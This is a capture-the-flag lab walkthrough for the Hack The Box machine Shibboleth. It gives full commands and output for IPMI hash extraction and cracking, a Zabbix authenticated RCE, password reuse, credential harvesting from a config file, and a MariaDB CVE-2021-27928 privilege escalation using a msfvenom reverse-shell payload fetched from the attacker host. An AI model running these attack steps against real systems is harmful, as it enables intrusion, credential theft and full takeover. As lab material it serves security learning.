# Shibboleth

# Skills

# Enumeration

The inital enumeration showed only port 80 open.

```bash
# Nmap 7.94 scan initiated Wed Nov  1 16:29:49 2023 as: nmap -p- -n -Pn -vvv -oG fast_2 10.10.11.124
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.11.124 ()   Status: Up
Host: 10.10.11.124 ()   Ports: 80/open/tcp//http///     Ignored State: closed (65534)
# Nmap done at Wed Nov  1 16:30:23 2023 -- 1 IP address (1 host up) scanned in 33.66 seconds
```

To access the web we need `shibboleth.htb` to point to the machine IP. In this web server we won’t find anything, so we need to enumerate in other parts:

- We could try to look for subdomains
- We could scan UDP ports and check if any of them are opened

Scanning UDP ports reported the following:

```python
PORT    STATE SERVICE  REASON
623/udp open  asf-rmcp udp-response ttl 63
```

Looking in Hacktricks we can see that we can enumerate and potentially get the password hash of the users of this service. First we will enumerate users, but we have to guess one existing user. We can try tipical admin user names and in the end we got one.

```bash
┌──(kali㉿kali)-[~/machines/linux/shibboleth/ipmitool]
└─$ ipmitool -I lanplus -C 0 -H 10.10.11.124 -U Administrator -P root user list
ID  Name             Callin  Link Auth  IPMI Msg   Channel Priv Limit
1                    true    false      false      USER
2   Administrator    true    false      true       USER
3                    true    false      false      Unknown (0x00)
4                    true    false      false      Unknown (0x00)
5                    true    false      false      Unknown (0x00)
6                    true    false      false      Unknown (0x00)
7                    true    false      false      Unknown (0x00)
8                    true    false      false      Unknown (0x00)
9                    true    false      false      Unknown (0x00)
10                   true    false      false      Unknown (0x00)
11                   true    false      false      Unknown (0x00)
12                   true    false      false      Unknown (0x00)
13                   true    false      false      Unknown (0x00)
14                   true    false      false      Unknown (0x00)
15                   true    false      false      Unknown (0x00)
16                   true    false      false      Unknown (0x00)
17                   true    false      false      Unknown (0x00)
18                   true    false      false      Unknown (0x00)
19                   true    false      false      Unknown (0x00)
20                   true    false      false      Unknown (0x00)
21                   true    false      false      Unknown (0x00)
22                   true    false      false      Unknown (0x00)
23                   true    false      false      Unknown (0x00)
24                   true    false      false      Unknown (0x00)
25                   true    false      false      Unknown (0x00)
26                   true    false      false      Unknown (0x00)
27                   true    false      false      Unknown (0x00)
```

Next thing is to retrive his hash, searching in google will gives us the correct tool for this,

```bash
┌──(kali㉿kali)-[~/machines/linux/shibboleth/ipmiPwner]
└─$ sudo python ipmipwner.py --host 10.10.11.124 -u Administrator -c john --password-wordlist /usr/share/wordlists/rockyou.txt --output-hash hash
[*] Checking if port 623 for host 10.10.11.124 is active
[*] The username: Administrator is valid                                                  
[*] Saving hash for user: Administrator in file: "hash"
[*] The hash for user: Administrator
   \_ $rakp$a4a3a2a002140000cc9a3032dc9cdd2bfbc03d23cbdfa7654bdb75e08c9d986c5b4b343c053bdb67a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$798cb1a1d25dc7c9b3c6a6267d77d602f5092151
[*] Starting the hash cracking with john
                                                                                                                                                                                                                                            
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 128/128 SSE2 4x])
Will run 8 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
ilovepumkinpie1  (10.10.11.124 Administrator)     
1g 0:00:00:00 DONE (2023-11-02 12:49) 1.265g/s 9457Kp/s 9457Kc/s 9457KC/s in_SecT..iarhsm
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

And we got `Administrator:ilovepumkinpie1` as new credentials, but there is no SSH in the machine or login panel in the web, so we are missing something. We will enumerate subdomains.

```bash
┌──(kali㉿kali)-[~/machines/linux/shibboleth]
└─$ wfuzz --hc 404 -L  -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -H 'Host: FUZZ.shibboleth.htb' http://shibboleth.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shibboleth.htb/
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000001601:   200        29 L     219 W      3684 Ch     "monitor"
```

We got one subdomain called `monitor.shibboleth.htb` . This is a virtual host so we add it to the **hosts** file and acccess the new domain. Here we can see a login panel and our gathered credentials actually work. 

# Foothold

As we can see the web is a Zabbix service, which is used to monitor net elements. We can try to search in Google if there is any way to execute commands, and indeed, there is one.  We can use the following exploit [https://www.exploit-db.com/exploits/50816](https://www.exploit-db.com/exploits/50816) to execute a command in the server. 

```bash
┌──(kali㉿kali)-[~/machines/linux/shibboleth]
└─$  python rce.py http://monitor.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.12 4444
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[+] the payload has been Uploaded Successfully
[+] you should find it at http://monitor.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33617
[+] set the listener at 4444 please...
[?] note : it takes up to +1 min so be patient :)
[+] got a shell ? [y]es/[N]o:
```

We are supposed to have a shell in less than a minute but if not we can access the link and click on **Execute Now** bottom and in less than a minute we will have a shell in our listener.

```bash
┌──(kali㉿kali)-[~/machines/linux/shibboleth/ipmitool]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.124] 48896
sh: 0: can't access tty; job control turned off
$ whoami     
zabbix
```

# Privilege escalation

We can check what other users are in the system, after getting a full interactive shell.

```bash
zabbix@shibboleth:/$ cat /etc/passwd | grep sh  
root:x:0:0:root:/root:/bin/bash
ipmi-svc:x:1000:1000:ipmi-svc,,,:/home/ipmi-svc:/bin/bash
```

Since we see a user we can try the password `ilovepumkinpie1` to log in as hi, and we get a shell as this new user. 

```bash
zabbix@shibboleth:/$ su ipmi-svc    
Password: 
ipmi-svc@shibboleth:/$
```

This new user must have any new rights that we can leverage in order to escalate privileges, but we are in no new groups and we cannot execute sudo. We can try to look for files in other directories out from our home directory that belongs to the user `ipmi-svc` or to his group. Diretories that we want to search are normally `/etc`, `/var` and `/opt` .

```bash
ipmi-svc@shibboleth:~$ find /etc/ -user 'ipmi-svc' 2>/dev/null -ls
ipmi-svc@shibboleth:~$ find /etc/ -group 'ipmi-svc' 2>/dev/null -ls
1885     24 -rw-r-----   1 root    ipmi-svc    22306 Oct 18  2021 /etc/zabbix/zabbix_server.conf.dpkg-dist
39531    24 -rw-r-----   1 root    ipmi-svc    21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
```

If check what’s inside  `/etc/zabbix/zabbix_server.conf` we will get a lot of commented lines. We can erase those from the output with the following command.

```bash
ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep -vE '^#' | sed '/^\s*$/d'
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
```

And we get a password and a user for the database. Next step is to connect to the database.

```bash
ipmi-svc@shibboleth:~$ mysql -uzabbix -pbloooarskybluh 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 483
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

The first thing we can check if the MariaDB version which is `10.3.25-MariaDB-0ubuntu0.20.04.1` . The result is a PrivEsc exploit for the version, we can get it from this repository https://github.com/Al1ex/CVE-2021-27928. Following the steps, we can finally get a shell as root.

- First we generate our payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.12 LPORT=5555 -f elf-so -o CVE-2021-27928.so
```

- Then we upload this to the victim and set a listener in the specified port

```bash
ipmi-svc@shibboleth:~$ curl 10.10.14.12/CVE-2021-27928.so -o CVE-2021-27928.so
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   476  100   476    0     0   4533      0 --:--:-- --:--:-- --:--:--  4533
ipmi-svc@shibboleth:~$ ls
CVE-2021-27928.so  user.txt
```

- We trigger the vulnerability

```bash
ipmi-svc@shibboleth:~$ mysql -uzabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/home/ipmi-svc/CVE-2021-27928.so";'
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
```

Finally we should get a shell in our listener.

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.124] 44314
whoami
root
```